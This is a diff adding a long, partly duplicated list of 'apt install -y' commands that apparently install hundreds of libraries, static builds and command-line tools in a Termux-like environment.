+
+apt install -y libpsl-static
+
+apt install -y libpugixml
+
+apt install -y libqrencode
+
+apt install -y libraptor2
+
+apt install -y libraptor2-static
+
+apt install -y libraqm
+
+apt install -y librasqal
+
+apt install -y librasqal-static
+
+apt install -y librav1e
+
+apt install -y librav1e-static
+
+apt install -y libre2
+
+apt install -y libregexp-assemble-perl
+
+apt install -y libresolv-wrapper
+
+apt install -y libretls
+
+apt install -y libretls-static
+
+apt install -y librime
+
+apt install -y librinutils
+
+apt install -y librnnoise
+
+apt install -y librnnoise-static
+
+apt install -y librocksdb
+
+apt install -y librocksdb-static
+
+apt install -y librsvg
+
+apt install -y librsync
+
+apt install -y librtmidi
+
+apt install -y librttopo
+apt install -y librttopo-static
+
+apt install -y libsamplerate
+
+apt install -y libsasl
+
+apt install -y libsasl-static
+
+apt install -y libsass
+
+apt install -y libsass-static
+apt install -y libsearpc
+
+apt install -y libsearpc-static
+
+apt install -y libseat
+apt install -y libseccomp
+
+apt install -y libseccomp-static
+
+apt install -y libsecp256k1
+apt install -y libsecp256k1-static
+
+apt install -y libsecret
+
+apt install -y libshout
+apt install -y libshout-static
+
+apt install -y libsigc++-2.0
+
+apt install -y libsigc++-3.0
+apt install -y libsignal-protocol-c
+
+apt install -y libsigsegv
+apt install -y libsigsegv-static
+
+apt install -y libsixel
+
+apt install -y libsixel-static
+
+apt install -y libslirp
+
+apt install -y libsm
+apt install -y libsm-static
+
+apt install -y libsmartcols
+
+apt install -y libsnappy
+
+apt install -y libsndfile
+
+apt install -y libsndfile-static
+
+apt install -y libsodium
+
+apt install -y libsodium-static
+apt install -y libsoldout
+
+apt install -y libsoldout-static
+
+apt install -y libsophia
+
+apt install -y libsophia-static
+
+apt install -y libsoundtouch
+
+apt install -y libsoundtouch-static
+
+apt install -y libsoup
+
+apt install -y libsoup3
+
+apt install -y libsoxr
+
+apt install -y libspatialindex
+
+apt install -y libspatialite
+
+apt install -y libspatialite-static
+apt install -y libspdlog
+
+apt install -y libspectre
+
+apt install -y libspectre-static
+
+apt install -y libspeex
+
+apt install -y libspeex-static
+
+apt install -y libspice-protocol
+
+apt install -y libspice-server
+
+apt install -y libspice-server-static
+
+apt install -y libsqlite
+
+apt install -y libsqlite-static
+
+apt install -y libsqlite-tcl
+apt install -y libsrt
+
+apt install -y libssh
+
+apt install -y libssh2
+
+apt install -y libssh2-static
+apt install -y libstemmer
+
+apt install -y libstemmer-static
+
+apt install -y libstrophe
+apt install -y libstrophe-static
+
+apt install -y libt3config
+
+apt install -y libt3highlight
+
+apt install -y libt3key
+
+apt install -y libt3widget
+apt install -y libt3window
+
+apt install -y libtalloc
+
+apt install -y libtalloc-static
+
+apt install -y libtasn1
+
+apt install -y libtasn1-static
+apt install -y libtbb
+
+apt install -y libtd
+
+apt install -y libtd-static
+
+apt install -y libtdb
+
+apt install -y libtermkey
+
+apt install -y libtheora-static
+apt install -y libtiff
+apt install -y libtiff-static
+
+apt install -y libtiff-utils
+
+apt install -y libtiledb
+
+apt install -y libtins
+apt install -y libtinyxml
+
+apt install -y libtinyxml2
+
+apt install -y libtirpc
+
+apt install -y libtirpc-static
+
+apt install -y libtllist
+
+apt install -y libtomcrypt
+
+apt install -y libtomcrypt-static
+
+apt install -y libtommath
+
+apt install -y libtommath-static
+
+apt install -y libtool
+
+apt install -y libtorrent-rasterbar
+
+apt install -y libtorrent-static
+apt install -y libtpms
+
+apt install -y libtpms-static
+apt install -y libtranscript
+
+apt install -y libtree-ldd
+
+apt install -y libtreesitter
+
+apt install -y libtreesitter-static
+
+apt install -y libtsduck
+
+apt install -y libtsduck-static
+apt install -y libtvision
+
+apt install -y libtwolame
+
+apt install -y libtwolame-static
+
+apt install -y libuber-h3
+
+apt install -y libuchardet-static
+
+apt install -y libucontext
+
+apt install -y libucontext-static
+
+apt install -y libudfread-static
+apt install -y libunbound
+
+apt install -y libunbound-static
+
+apt install -y libunibilium
+
+apt install -y libunistring
+apt install -y libunistring-static
+apt install -y libunqlite
+
+apt install -y libupscaledb
+apt install -y libupscaledb-static
+
+apt install -y libusb
+
+apt install -y libusb-static
+
+apt install -y libusbmuxd
+
+apt install -y libusbmuxd-static
+apt install -y libusbredir
+
+apt install -y libusbredir-static
+
+apt install -y libutf8-range
+
+apt install -y libuuid
+
+apt install -y libuv
+
+apt install -y libuv-static
+
+apt install -y libv4l
+apt install -y libv4l-static
+
+apt install -y libvbisam
+apt install -y libvbisam-static
+
+apt install -y libvidstab
+apt install -y libvigra
+
+apt install -y libvips
+
+apt install -y libvips-static
+
+apt install -y libvmaf
+apt install -y libvmaf-static
+
+apt install -y libvo-amrwbenc
+apt install -y libvo-amrwbenc-static
+
+apt install -y libvorbis
+
+apt install -y libvorbis-static
+
+apt install -y libvpx
+
+apt install -y libvpx-static
+
+apt install -y libvxl
+
+apt install -y libwavpack
+
+apt install -y libwavpack-static
+
+apt install -y libwayland-cross-scanner
+
+apt install -y libwayland-protocols
+
+apt install -y libwebp
+apt install -y libwebp-static
+
+apt install -y libwebrtc-audio-processing
+
+apt install -y libwebrtc-audio-processing-static
+
+apt install -y libwebsockets
+
+apt install -y libwolfssl
+
+apt install -y libwren
+
+apt install -y libwslay
+
+apt install -y libwv
+
+apt install -y libwv-static
+
+apt install -y libx11
+
+apt install -y libx11-static
+
+apt install -y libx264
+apt install -y libx264-static
+
+apt install -y libx265
+
+apt install -y libx265-static
+
+apt install -y libxapian
+
+apt install -y libxapian-static
+
+apt install -y libxau
+
+apt install -y libxau-static
+
+apt install -y libxcb
+
+apt install -y libxcb-static
+
+apt install -y libxcfun
+
+apt install -y libxcursor
+
+apt install -y libxcursor-static
+
+apt install -y libxdg-basedir
+
+apt install -y libxdg-basedir-static
+
+apt install -y libxdmcp
+
+apt install -y libxdmcp-static
+
+apt install -y libxdrfile
+
+apt install -y libxext
+
+apt install -y libxext-static
+
+apt install -y libxfixes
+
+apt install -y libxfixes-static
+apt install -y libxft
+
+apt install -y libxft-static
+
+apt install -y libxi
+
+apt install -y libxi-static
+apt install -y libxls
+apt install -y libxls-static
+
+apt install -y libxlsxwriter
+
+apt install -y libxml2
+
+apt install -y libxml2-python
+
+apt install -y libxml2-python-static
+
+apt install -y libxml2-static
+
+apt install -y libxml2-utils
+
+apt install -y libxmlb
+
+apt install -y libxmlrpc-static
+
+apt install -y libxrandr
+
+apt install -y libxrandr-static
+
+apt install -y libxrender
+
+apt install -y libxrender-static
+
+apt install -y libxshmfence
+
+apt install -y libxshmfence-static
+apt install -y libxslt
+
+apt install -y libxslt-static
+
+apt install -y libxss
+
+apt install -y libxss-static
+
+apt install -y libxt
+apt install -y libxt-static
+apt install -y libxtst
+
+apt install -y libxtst-static
+apt install -y libxv
+
+apt install -y libxv-static
+
+apt install -y libxxf86vm
+apt install -y libxxf86vm-static
+
+apt install -y libyaml
+
+apt install -y libyaml-cpp
+
+apt install -y libyaml-static
+
+apt install -y libzen-static
+
+apt install -y libzim
+
+apt install -y libzimg
+
+apt install -y libzimg-static
+
+apt install -y libzip
+apt install -y libzix
+apt install -y libzmq
+
+apt install -y libzmq-static
+
+apt install -y libzopfli
+
+apt install -y libzthread-static
+apt install -y libzxing-cpp
+
+apt install -y lighttpd-static
+
+apt install -y lilv
+
+apt install -y lit
+
+apt install -y littlecms
+
+apt install -y littlecms-static
+
+apt install -y llvm-mingw-w64-libcompiler-rt
+apt install -y lowdown
+apt install -y lowdown-static
+
+apt install -y lsof-static
+
+apt install -y ltrace
+
+apt install -y lua-lgi
+
+apt install -y luv
+
+apt install -y lzlib
+apt install -y lzlib-static
+
+apt install -y lzop
+
+apt install -y mailutils-static
+
+apt install -y manpages
+apt install -y mariadb-static
+
+apt install -y marisa-static
+
+apt install -y matplotlib
+
+apt install -y mbedtls
+apt install -y mbedtls-static
+
+apt install -y megatools
+
+apt install -y mercury-static
+apt install -y mimetic-static
+
+apt install -y miniupnpc
+apt install -y miniupnpc-static
+
+apt install -y minizinc-static
+
+apt install -y mono-libs
+
+apt install -y mono-static
+
+apt install -y mpd-static
+
+apt install -y mpg123
+
+apt install -y mpg123-static
+
+apt install -y mruby-static
+
+apt install -y mupdf
+
+apt install -y mupdf-static
+
+apt install -y natpmpc-static
+
+apt install -y ncurses
+
+apt install -y ncurses-static
+
+apt install -y ncurses-ui-libs
+
+apt install -y ncurses-ui-libs-static
+apt install -y ndk-multilib
+
+apt install -y ndk-multilib-native-static
+
+apt install -y ndk-multilib-native-stubs
+
+apt install -y ndk-sysroot
+apt install -y net-snmp-static
+
+apt install -y netcdf-c
+
+apt install -y netcdf-c-static
+
+apt install -y oathtool-static
+
+apt install -y ocrad-static
+
+apt install -y octave-static
+
+apt install -y octomap-static
+apt install -y oniguruma
+apt install -y oniguruma-static
+apt install -y oorexx-static
+
+apt install -y opencolorio-static
+
+apt install -y sassc
+apt install -y scala
+
+apt install -y scrypt
+
+apt install -y seafile-client-static
+
+apt install -y serd
+
+apt install -y serf
+
+apt install -y serf-static
+apt install -y shaderc
+
+apt install -y sleuthkit
+
+apt install -y sleuthkit-static
+
+apt install -y smalltalk-static
+
+apt install -y sord
+
+apt install -y sox-static
+
+apt install -y speexdsp
+
+apt install -y speexdsp-static
+
+apt install -y spglib
+
+apt install -y spglib-static
+apt install -y sqlcipher-static
+
+apt install -y squashfs-tools-ng-static
+
+apt install -y sratom
+
+apt install -y srt-tools
+
+apt install -y ssdeep-static
+
+apt install -y stdman
+apt install -y stemwords
+
+apt install -y stfl
+
+apt install -y stfl-static
+apt install -y stoken-static
+
+apt install -y stunnel-static
+apt install -y subversion-perl-static
+
+apt install -y subversion-static
+
+apt install -y suil
+
+apt install -y suitesparse-static
+
+apt install -y sundials-static
+
+apt install -y swift-runtime-aarch64
+
+apt install -y swift-runtime-arm
+
+apt install -y swift-runtime-x86-64
+apt install -y swtpm-static
+
+apt install -y ta-lib
+apt install -y ta-lib-static
+
+apt install -y taglib
+apt install -y tcllib
+
+apt install -y teckit
+
+apt install -y teckit-static
+
+apt install -y tergent
+
+apt install -y termux-api-static
+
+apt install -y termux-auth
+
+apt install -y termux-gui-bash
+
+apt install -y texlive-bin-static
+
+apt install -y tidy-static
+
+apt install -y toml11
+
+apt install -y torsocks-static
+
+apt install -y totem-pl-parser
+
+apt install -y tree-sitter-lua-static
+
+apt install -y tree-sitter-markdown-static
+
+apt install -y tree-sitter-query-static
+
+apt install -y tree-sitter-vimdoc-static
+
+apt install -y unbound-static
+apt install -y unicorn-static
+
+
+apt install -y unshield
+
+apt install -y urdfdom
+
+apt install -y utf8proc
+
+apt install -y utf8proc-static
+
+apt install -y util-linux-static
+
+apt install -y valac-static
+
+apt install -y valadoc-static
+apt install -y valgrind-static
+
+apt install -y vamp-plugin-sdk-static
+
+apt install -y vde2-static
+apt install -y vgmstream
+
+apt install -y vulkan-loader
+
+apt install -y vulkan-utility-libraries
+
+apt install -y wasi-libc
+
+apt install -y wasmedge-static
+
+apt install -y wget2-static
+
+apt install -y wv-tools
+
+apt install -y x11-repo
+
+apt install -y xmlsec
+
+apt install -y xmlsec-static
+
+apt install -y xtrans
+
+apt install -y xvidcore-static
+apt install -y xxhash-static
+
+apt install -y yajl
+apt install -y yajl-static
+
+apt install -y yara-static
+
+apt install -y yasm-static
+
+apt install -y yuma123-static
+
+apt install -y zbar-static
+apt install -y zipios
+
+apt install -y zlib
+
+apt install -y zlib-static
+
+apt install -y zopfli
+
+apt install -y zpaq
+
+apt install -y zstd-static
+
+apt install -y zziplib
+
+apt install -y zzuf-static
+  
+apt install -y agg
+
+apt install -y cgdb
+
+apt install -y command-not-found
+apt install -y console-bridge
+apt install -y delve
+
+apt install -y electric-fence
+apt install -y gdb
+apt install -y google-glog
+
+apt install -y hstr
+
+apt install -y liblog4c
+
+apt install -y liblog4cxx
+
+apt install -y libmp3splt
+
+apt install -y libogg
+
+apt install -y libogg-static
+
+apt install -y liboggz
+
+apt install -y liboggz-static
+
+apt install -y libspdlog
+
+apt install -y libthread-db
+
+apt install -y libvorbis
+
+apt install -y lldb
+
+apt install -y moon-buggy
+
+apt install -y mp3splt
+
+apt install -y notmuch
+
+apt install -y obfs4proxy
+
+apt install -y openssh
+
+apt install -y sfeed
+
+apt install -y snowflake
+
+apt install -y snowflake-client
+apt install -y snowflake-proxy
+
+apt install -y ssdeep
+
+apt install -y strace
+
+apt install -y tenki-php
+
+apt install -y utfdecode
+
+apt install -y vorbis-tools
+
+apt install -y weggli
+apt install -y dnstop
+
+apt install -y libp8-platform
+
+apt install -y libpagmo
+
+apt install -y libpangomm-1.4
+
+apt install -y libpangomm-2.48
+apt install -y libpano13
+
+apt install -y libpano13-static
+
+apt install -y libpaper
+
+apt install -y libpaper-static
+
+apt install -y libpcap
+
+apt install -y libpcap-static
+apt install -y libpcreposix
+
+apt install -y libphysfs
+
+apt install -y libpipeline
+
+apt install -y libpipeline-static
+
+apt install -y libpixman
+
+apt install -y libpixman-static
+
+apt install -y libplacebo
+
+apt install -y libplist
+
+apt install -y libplist-static
+
+apt install -y libpluto
+
+apt install -y libpng
+
+apt install -y libpng-static
+
+apt install -y libpngwriter
+
+apt install -y libpngwriter-static
+
+apt install -y libpoco
+
+apt install -y libpolly
+
+apt install -y libpopt
+
+apt install -y libpopt-static
+
+apt install -y libprotobuf
+
+apt install -y libprotobuf-c
+
+apt install -y libprotobuf-c-static
+
+apt install -y libprotozero
+
+apt install -y libpsl
+
+apt install -y libpsl-static
+
+apt install -y libpugixml
+apt install -y 1oom
+
+apt install -y jftui
+apt install -y k9s
+
+apt install -y libisofs
+apt install -y libksba
+
+apt install -y libvpx
+
+apt install -y libzix
+apt install -y mkp224o
+
+apt install -y open-adventure
+
+apt install -y ossp-uuid
+
+apt install -y pacman4console
+
+apt install -y passphrase2pgp
+
+apt install -y prover9
+
+apt install -y rcshell
+
+
+apt install -y aalib
+apt install -y alsa-lib
+
+apt install -y aom-tools
+apt install -y apr
+
+apt install -y apr-util
+apt install -y assimp
+
+apt install -y aubio
+apt install -y babl
+
+apt install -y binaryen
+
+apt install -y c-ares
+
+apt install -y c-toxcore
+
+apt install -y cgal
+
+apt install -y cgif
+
+apt install -y chromaprint
+
+apt install -y cryptopp
+
+apt install -y distant
+
+apt install -y eigen
+
+apt install -y exiv2
+
+apt install -y fftw
+
+apt install -y flatbuffers
+
+apt install -y fmt
+
+apt install -y fontconfig
+
+apt install -y freeimage
+
+apt install -y gdal
+
+apt install -y gdbm
+apt install -y gdk-pixbuf
+
+apt install -y geographiclib
+
+apt install -y gflags
+
+apt install -y giflib
+apt install -y glib
+
+apt install -y glib-bin
+
+apt install -y glm
+
+apt install -y google-glog
+
+apt install -y gpgme
+
+apt install -y gpgmepp
+
+apt install -y gsasl
+
+apt install -y gsl
+apt install -y gst-libav
+
+apt install -y gumbo-parser
+
+apt install -y harfbuzz-utils
+apt install -y hoedown
+
+apt install -y htslib
+
+apt install -y hummin
+
+apt install -y id3lib
+
+apt install -y imath
+
+apt install -y imlib2
+
+apt install -y json-glib
+
+apt install -y jsoncpp
+
+apt install -y ldns
+
+apt install -y leptonica
+
+apt install -y leveldb
+
+apt install -y liba52
+
+apt install -y libacl
+
+apt install -y libaml
+
+apt install -y libandroid-complex-math
+
+apt install -y libandroid-execinfo
+
+apt install -y libandroid-glob
+
+apt install -y libandroid-posix-semaphore
+
+apt install -y libandroid-spawn
+
+apt install -y libandroid-support
+
+apt install -y libandroid-sysv-semaphore
+
+apt install -y libandroid-wordexp
+
+apt install -y libao
+
+apt install -y libaom
+
+apt install -y libarchive
+
+apt install -y libasio
+
+apt install -y libasm
+
+apt install -y libasm-static
+
+apt install -y libass
+
+apt install -y libassuan
+
+apt install -y libblkid
+
+apt install -y libblocksruntime
+
+apt install -y libblosc
+
+apt install -y libbluray
+
+apt install -y libburn
+
+apt install -y libbz2
+
+apt install -y libc++
+
+apt install -y libc-client
+
+apt install -y libcaca
+
+apt install -y libcairo
+
+apt install -y libcap-ng
+
+apt install -y libccd
+
+apt install -y libcddb
+
+apt install -y libceres-solver
+apt install -y libchipmunk
+
+apt install -y libcln
+
+apt install -y libcloog
+
+apt install -y libcoinor-cgl
+
+apt install -y libconfig
+apt install -y libconfuse
+
+apt install -y libcpufeatures
+
+apt install -y libcroco
+
+apt install -y libcue
+
+apt install -y libcurl
+
+apt install -y libcwidget
+
+apt install -y libdaemon
+
+apt install -y libdb
+
+apt install -y libde265
+
+apt install -y libdebuginfod
+apt install -y libdecor
+
+apt install -y libdeflate
+
+apt install -y libdevil
+
+apt install -y libdmtx
+
+apt install -y libdvbpsi
+
+apt install -y libdvdnav
+
+apt install -y libdvdread
+
+apt install -y libdw
+
+apt install -y libdw-static
+apt install -y libebml
+
+apt install -y libedit
+
+apt install -y libelf
+
+apt install -y libenet
+
+apt install -y libev
+
+apt install -y libevent
+
+apt install -y libexif
+
+apt install -y libexpat
+
+apt install -y libfann
+apt install -y libfcft
+
+apt install -y libfcl
+
+apt install -y libfdisk
+
+apt install -y libfdk-aac
+apt install -y libffi
+
+apt install -y libfinalcut
+
+apt install -y libflac
+
+apt install -y libflann
+
+apt install -y libfreexl
+
+apt install -y libftxui
+
+apt install -y libgc
+
+apt install -y libgcrypt
+
+apt install -y libgd
+
+apt install -y libgee
+
+apt install -y libgeotiff
+
+apt install -y libgf2x
+
+apt install -y libgit2
+
+apt install -y libglvnd
+
+apt install -y libgmp
+
+apt install -y libgpg-error
+
+apt install -y libgsasl
+
+apt install -y libgsf
+
+apt install -y libgtop
+
+apt install -y libhangul
+
+apt install -y libheif
+
+apt install -y libhiredis
+
+apt install -y libhyphen
+
+apt install -y libice
+
+apt install -y libicu
+apt install -y libid3tag
+
+apt install -y libidn
+
+apt install -y libimagequant
+
+apt install -y libimobiledevice
+
+apt install -y libimobiledevice-glue
+
+apt install -y libimtui
+
+apt install -y libisl
+
+apt install -y libisofs
+
+apt install -y libjansi
+
+apt install -y libjansson
+
+apt install -y libjasper
+
+apt install -y libjpeg-turbo
+
+apt install -y libkiwix
+
+apt install -y libksba
+
+apt install -y liblightning
+apt install -y libliquid-dsp
+
+apt install -y libllvm
+
+apt install -y liblo
+
+apt install -y liblog4c
+
+apt install -y liblrdf
+
+apt install -y libltdl
+
+apt install -y liblua51
+
+apt install -y liblua52
+
+apt install -y liblua53
+
+apt install -y liblua54
+
+apt install -y liblz4
+
+apt install -y liblzma
+
+apt install -y liblzo
+
+apt install -y libmatio
+
+apt install -y libmatroska
+
+apt install -y libmaxminddb
+
+apt install -y libmcrypt
+
+apt install -y libmediainfo
+
+apt install -y libmesode
+
+apt install -y libmhash
+
+apt install -y libmicrohttpd
+
+apt install -y libminizip-ng
+
+apt install -y libmnl
+
+apt install -y libmodplug
+
+apt install -y libmosquitto
+
+apt install -y libmount
+
+apt install -y libmpc
+
+apt install -y libmpdclient
+apt install -y libmpfr
+
+apt install -y libmuparser
+
+apt install -y libmusicbrainz
+
+apt install -y libmypaint
+
+apt install -y libneon
+
+apt install -y libnet
+
+apt install -y libnettle
+apt install -y libnewt
+
+apt install -y libnfc
+
+apt install -y libnfs
+
+apt install -y libnftnl
+
+apt install -y libnghttp2
+
+apt install -y libnghttp3
+
+apt install -y libnova
+
+apt install -y libnpth
+
+apt install -y libntl
+
+apt install -y libode
+
+apt install -y libogg
+
+apt install -y liboggz
+apt install -y libopenblas
+
+apt install -y libopenfec
+
+apt install -y libopenmpt
+
+apt install -y liborc
+apt install -y libosl
+
+apt install -y libosmium
+apt install -y libosmpbf
+
+apt install -y libp8-platform
+
+apt install -y libpagmo
+
+apt install -y libpaper
+
+apt install -y libpcap
+
+apt install -y libpipeline
+
+apt install -y libpixman
+
+apt install -y libplacebo
+
+apt install -y libplist
+apt install -y libpluto
+
+apt install -y libpng
+apt install -y libpngwriter
+
+apt install -y libpopt
+
+apt install -y libprotobuf
+
+apt install -y libprotobuf-c
+
+apt install -y libpsl
+
+apt install -y libqrencode
+
+apt install -y libraptor2
+
+apt install -y libraqm
+
+apt install -y librasqal
+
+apt install -y librav1e
+
+apt install -y libre2
+
+apt install -y librinutils
+
+apt install -y librsvg
+
+apt install -y librsync
+
+apt install -y librttopo
+
+apt install -y libsamplerate
+
+apt install -y libsasl
+
+apt install -y libseccomp
+
+apt install -y libsecp256k1
+
+apt install -y libsecret
+
+apt install -y libshout
+
+apt install -y libsignal-protocol-c
+
+apt install -y libsigsegv
+
+apt install -y libsm
+apt install -y libsmartcols
+
+apt install -y libsnappy
+
+apt install -y libsndfile
+apt install -y libsodium
+
+apt install -y libsoldout
+
+apt install -y libsophia
+
+apt install -y libsoundtouch
+
+apt install -y libsoup
+apt install -y libsoup3
+
+apt install -y libsoxr
+
+apt install -y libspdlog
+
+apt install -y libspectre
+
+apt install -y libsqlite
+
+apt install -y libssh
+
+apt install -y libssh2
+
+apt install -y libstrophe
+
+apt install -y libt3config
+
+apt install -y libt3highlight
+
+apt install -y libt3key
+
+apt install -y libt3widget
+
+apt install -y libt3window
+
+apt install -y libtasn1
+
+apt install -y libtd
+
+apt install -y libtermkey
+
+apt install -y libthread-db
+
+apt install -y libtins/
+
+apt install -y libtirpc
+
+apt install -y libtllist
+
+apt install -y libtommath
+
+apt install -y libtool
+apt install -y libtorrent
+
+apt install -y libtranscript
+
+apt install -y libuchardet
+
+apt install -y libucontext
+
+apt install -y libudfread
+
+apt install -y libunibilium
+
+apt install -y libunistring
+
+apt install -y libusb
+
+apt install -y libusbmuxd
+
+apt install -y libuuid
+
+apt install -y libuv
+
+apt install -y libvidstab
+
+apt install -y libvigra
+
+apt install -y libvips
+
+apt install -y libvo-amrwbenc
+
+apt install -y libvorbis
+
+apt install -y libvterm
+
+apt install -y libwayland
+
+apt install -y libwayland-protocols
+apt install -y libwebp
+
+apt install -y libwebrtc-audio-processing
+
+apt install -y libwebsockets
+
+apt install -y libwslay
+
+apt install -y libwv
+
+apt install -y libx11
+
+apt install -y libx264
+
+apt install -y libx265
+
+apt install -y libxapian
+
+apt install -y libxau
+
+apt install -y libxcb
+
+apt install -y libxcfun
+
+apt install -y libxcursor
+
+apt install -y libxdmcp
+
+apt install -y libxdrfile
+
+apt install -y libxext
+
+apt install -y libxfixes
+
+apt install -y libxft
+
+apt install -y libxi
+
+apt install -y libxls
+
+apt install -y libxlsxwriter
+
+apt install -y libxml2
+
+apt install -y libxmlb
+
+apt install -y libxrandr
+
+apt install -y libxrender
+
+apt install -y libxshmfence
+
+apt install -y libxslt
+
+apt install -y libxss
+
+apt install -y libxt
+
+apt install -y libxtst
+apt install -y libxv
+
+apt install -y libxxf86vm
+apt install -y libzen
+
+apt install -y libzim
+apt install -y libzimg
+
+apt install -y libzip
+
+apt install -y libzita-convolver
+apt install -y libzix
+apt install -y libzopfli
+
+apt install -y libzxing-cpp
+
+apt install -y lilv
+
+apt install -y littlecms
+
+apt install -y lowdown
+apt install -y ltrace
+
+apt install -y lua-lpeg
+
+apt install -y lua51-lpeg
+
+apt install -y lua52-lpeg
+
+apt install -y lua53-lpeg
+
+apt install -y lzlib
+apt install -y manpages
+
+apt install -y matplotlib
+
+apt install -y mbedtls
+
+apt install -y megatools
+
+apt install -y mimetic
+
+apt install -y miniupnpc
+
+apt install -y mpg123
+
+apt install -y mupdf
+apt install -y ncurses
+
+apt install -y ndk-sysroot
+
+apt install -y nlopt
+apt install -y oniguruma
+
+apt install -y pcaudiolib
+
+apt install -y pcre
+
+apt install -y pcre2
+
+apt install -y plzip
+
+apt install -y pomodoro-curses
+
+apt install -y poppler
+
+apt install -y portaudio
+
+apt install -y portmidi
+
+apt install -y protobuf-static
+
+apt install -y pulseaudio-glib-static
+
+apt install -y pycairo
+
+apt install -y python-contourpy
+
+apt install -y python-pillow
+
+apt install -y python-skia-pathops
+
+apt install -y python-xlib
+
+apt install -y qrupdate-ng
+
+apt install -y plantuml
+apt install -y plutolang
+
+apt install -y pngcrush
+apt install -y pngquant
+apt install -y poac
+apt install -y pocketbase
+
+apt install -y polipo
+
+apt install -y poppler
+
+apt install -y poppler-data
+apt install -y posixvala
+
+apt install -y postgis
+
+apt install -y postgresql
+
+apt install -y postgresql-static
+apt install -y potrace
+apt install -y predict
+
+apt install -y privoxy
+
+apt install -y procps
+
+apt install -y profanity
+
+apt install -y progress
+
+apt install -y proj
+
+apt install -y proot-distro
+
+apt install -y proton-bridge
+
+apt install -y prover9
+
+apt install -y proxmark3
+
+apt install -y proxychains-ng
+apt install -y ptex
+
+apt install -y ptunnel-ng
+
+apt install -y pulseaudio
+apt install -y pulseaudio-glib
+
+apt install -y pulseaudio-glib-static
+
+apt install -y pup
+
+apt install -y pv
+
+apt install -y pwgen
+
+apt install -y pycairo
+apt install -y pygobject
+apt install -y pystring
+
+apt install -y python
+
+apt install -y python-apt
+
+apt install -y python-bcrypt
+apt install -y python-contourpy
+
+apt install -y python-cryptography
+apt install -y python-greenlet
+apt install -y python-grpcio
+
+apt install -y python-lameenc
+apt install -y python-libsass
+
+apt install -y python-lxml
+
+apt install -y python-msgpack
+
+apt install -y python-numpy
+
+apt install -y python-pillow
+apt install -y python-pip
+apt install -y python-pyarrow
+
+apt install -y python-scipy
+
+apt install -y python-skia-pathops
+apt install -y python-tldp
+
+apt install -y python-torchaudio
+apt install -y python-xcbgen
+
+apt install -y python2
+
+apt install -y pyunbound
+
+apt install -y pzstd
+
+apt install -y qemu-system-aarch64-headless
+apt install -y qemu-system-arm-headless
+apt install -y qemu-system-i386-headless
+
+apt install -y qemu-system-m68k-headless
+apt install -y qemu-system-ppc-headless
+
+apt install -y qemu-system-ppc64-headless
+
+apt install -y qemu-system-riscv32-headless
+
+apt install -y qemu-system-riscv64-headless
+
+apt install -y qemu-system-x86-64-headless
+
+apt install -y qemu-utils
+
+apt install -y qpdf
+
+apt install -y qrsspig
+
+apt install -y qrupdate-ng
+apt install -y quick-lint-js
+
+apt install -y quickjs
+
+apt install -y quilt
+apt install -y racket
+
+apt install -y rage
+apt install -y ragel
+
+apt install -y ragel-static
+apt install -y range-v3
+apt install -y ranger
+
+apt install -y rapidjson
+apt install -y ratt
+
+apt install -y rav1e
+
+apt install -y ravencoin
+
+apt install -y rclone
+apt install -y rcm
+
+apt install -y rcs
+apt install -y rdfind
+apt install -y rdiff-backup
+
+apt install -y rdircd
+apt install -y rdrview
+apt install -y re2c
+
+apt install -y redis
+
+apt install -y remind
+
+apt install -y renameutils
+
+apt install -y reptyr
+apt install -y resolv-conf
+apt install -y restic
+apt install -y restish
+apt install -y rgbds
+
+apt install -y rhash
+apt install -y rig
+apt install -y rip
+
+apt install -y ripgrep
+
+apt install -y ripgrep-all
+apt install -y ripsecrets
+apt install -y rizin
+apt install -y rlwrap
+apt install -y rnr
+
+apt install -y robin-map
+apt install -y robotfindskitten
+
+apt install -y root-repo
+
+apt install -y roqet
+
+apt install -y rpm
+apt install -y rq
+
+apt install -y rsgain
+apt install -y rubberband
+
+apt install -y rubberband-ladspa
+apt install -y rubberband-lv2
+apt install -y rubberband-vamp
+
+apt install -y ruby
+apt install -y runit
+apt install -y rush
+apt install -y rust
+apt install -y rust-bindgen
+
+apt install -y rust-std-aarch64-linux-android
+
+apt install -y rust-std-armv7-linux-androideabi
+
+apt install -y rust-std-i686-linux-android
+
+apt install -y rust-std-wasm32-unknown-unknown
+
+apt install -y rust-std-wasm32-wasi
+
+apt install -y rust-std-wasm32-wasip1
+apt install -y rust-std-wasm32-wasip2
+apt install -y rust-std-x86-64-linux-android
+apt install -y rw
+
+apt install -y rxfetch
+apt install -y salty-chat
+apt install -y sccache
+
+apt install -y scdaemon
+
+apt install -y scdoc
+
+apt install -y scrub
+
+apt install -y seafile-client
+apt install -y sed
+
+apt install -y sendxmpp
+
+apt install -y sensible-utils
+
+apt install -y serd
+apt install -y serf
+apt install -y sfeed
+apt install -y sharutils
+apt install -y sheldon
+apt install -y shell2http
+apt install -y shellharden
+
+apt install -y shiori
+
+apt install -y shntool
+
+apt install -y shtool
+apt install -y signify
+apt install -y silversearcher-ag
+apt install -y sing-box
+
+apt install -y sl
+apt install -y slang
+apt install -y slashtime
+
+apt install -y sleuthkit
+
+apt install -y slugify
+apt install -y smalltalk
+
+apt install -y snake
+apt install -y snowflake
+
+apt install -y snowflake-client
+apt install -y snowflake-proxy
+
+apt install -y softether-vpn
+apt install -y solidity
+
+apt install -y sops
+
+apt install -y sord
+apt install -y sourcekit-lsp
+
+apt install -y sox
+
+apt install -y spatialite-tools
+
+apt install -y speedtest-go
+apt install -y speexdsp
+
+apt install -y spglib
+
+apt install -y spglib-static
+apt install -y spiped
+
+apt install -y squashfs-tools-ng
+apt install -y squashfs-tools-ng-static
+
+apt install -y squeezelite
+apt install -y sratom
+apt install -y srt2vobsub
+apt install -y ssdeep
+apt install -y sshping
+apt install -y sssnake
+
+apt install -y ssss
+
+apt install -y stag
+apt install -y starship
+
+apt install -y stdman
+
+apt install -y steghide
+
+apt install -y step-cli
+
+apt install -y stfl
+apt install -y stow
+apt install -y strace
+
+apt install -y streamripper
+apt install -y suil
+apt install -y suitesparse
+apt install -y sun
+
+apt install -y sundials
+apt install -y surfraw
+
+apt install -y svt-av1
+apt install -y swi-prolog
+
+apt install -y swift
+
+apt install -y swiftshader
+apt install -y swig
+
+apt install -y syncthing
+
+apt install -y sysprop
+apt install -y taglib
+apt install -y tar
+apt install -y tasksh
+apt install -y taskwarrior
+apt install -y tcl
+apt install -y tdl
+apt install -y tea
+apt install -y teckit
+apt install -y tectonic
+apt install -y telegram-bot-api
+apt install -y telegram-cli
+apt install -y teleport-tsh
+apt install -y tenki-php 
+apt install -y tergent
+
+apt install -y termimage
+
+apt install -y termplay
+
+apt install -y termux-am-socket
+apt install -y termux-create-package
+apt install -y termux-exec
+apt install -y termux-gui-bash
